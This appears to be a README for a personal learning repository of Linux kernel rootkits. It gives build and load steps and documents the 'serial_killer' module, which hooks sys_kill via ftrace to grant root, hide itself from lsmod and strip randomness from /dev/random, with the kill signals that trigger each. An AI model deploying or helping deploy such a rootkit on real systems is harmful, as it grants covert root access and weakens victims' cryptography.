# Rootkits
Contains multiple techniques use in rootkits.
Each sub directory contains custom rootkits that I made over the course of my learning. As of now, I have only created the serial_killer rootkit for learning purposes.

## Dependencies

### Ubuntu/Debian
```text
# sudo apt-get update;
# sudo apt-get -y install build-essential linux-headers-$(uname -r) 
```
## Centos
```text
# sudo yum check-update
# sudo yum update
# sudo yum install kernel-devel
```
## Fedora
```text
# sudo dnf check-update
# sudo dnf update
# sudo dnf install kernel-devel
```

## Compilation
```text
# cd /path/to/chosen/rootkit
# make
```

## Inject rootkit
```text
# sudo insmod rootkit.ko
```

## Remove rootkit
```text
# sudo rmmod rootkit.ko
```

## Serial Killer
This is my first rootkit that utitlises ftrace to hook onto `sys_kill` which does the following:

 1. Priviledge Escalation
 2. Hides its presence 
 3. Intercepting /dev/random and /dev/urandom to remove randomness.

 ### Commands
 ```text
kill -60 1 # Sets uid to 0
kill -60 0 # Sets uid to original

kill -61 1 # Hides itself from lsmod
kill -61 0 # Shows itself in lsmod

kill -62 1 # Activates randomness
kill -62 0 # Deactivates randomness
 ```
